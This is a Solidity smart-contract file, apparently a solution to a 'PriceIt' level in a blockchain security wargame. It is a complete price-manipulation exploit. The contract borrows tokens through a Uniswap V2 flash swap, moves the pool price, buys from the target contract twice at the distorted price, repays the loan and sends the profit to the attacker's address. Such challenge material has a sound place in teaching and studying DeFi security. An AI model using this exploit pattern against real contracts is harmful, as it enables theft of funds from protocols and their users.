// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../levels/PriceIt.sol';

contract PriceItAttack {
  IUniswapV2Factory private uniFactory;
  IUniswapV2Router private uniRouter;

  function doYourThing(PriceIt instance) external {
    IERC20 token0 = instance.token0();
    IERC20 token1 = instance.token1();
    IERC20 token2 = instance.token2();
    uniFactory = instance.uniFactory();
    uniRouter = instance.uniRouter();
    IUniswapV2Pair token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
    uint256 flashSwapAmount = 50000 ether;
    bytes memory data = abi.encode(token0, token1, token0Token2Pair, flashSwapAmount, instance, msg.sender);
    if (address(token0) < address(token2)) {
      IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
    } else {
      IUniswapV2Pair(token0Token2Pair).swap(0, flashSwapAmount, address(this), data);
    }
  }

  function uniswapV2Call(
    address,
    uint256,
    uint256,
    bytes calldata data
  ) external {
    (
      IERC20 token0,
      IERC20 token1,
      IUniswapV2Pair token0Token2Pair,
      uint256 flashSwapAmount,
      PriceIt instance,
      address attacker
    ) = abi.decode(data, (IERC20, IERC20, IUniswapV2Pair, uint256, PriceIt, address));
    token0.approve(address(uniRouter), flashSwapAmount);
    uint256 token1Output = swapTwoTokens(token0, token1, flashSwapAmount);
    token1.approve(address(instance), token1Output);
    instance.buyToken(token1Output / 2, token1);
    instance.buyToken(token1Output / 2, token1);
    returnFlashSwap(address(token0), address(token0Token2Pair), flashSwapAmount);
    token0.transfer(attacker, token0.balanceOf(address(this)));
  }

  function swapTwoTokens(
    IERC20 from,
    IERC20 to,
    uint256 inputAmount
  ) private returns (uint256 outputAmount) {
    address[] memory path = new address[](2);
    path[0] = address(from);
    path[1] = address(to);
    from.approve(address(uniRouter), inputAmount);
    uint256[] memory outputs = uniRouter.swapExactTokensForTokens(inputAmount, 0, path, address(this), block.timestamp);
    return outputs[1];
  }

  function returnFlashSwap(
    address tokenBorrow,
    address pair,
    uint256 amountTaken
  ) private {
    // about 0.3%
    uint256 fee = ((amountTaken * 3) / 997) + 1;
    uint256 amountToRepay = amountTaken + fee;
    IERC20(tokenBorrow).transfer(pair, amountToRepay);
  }
}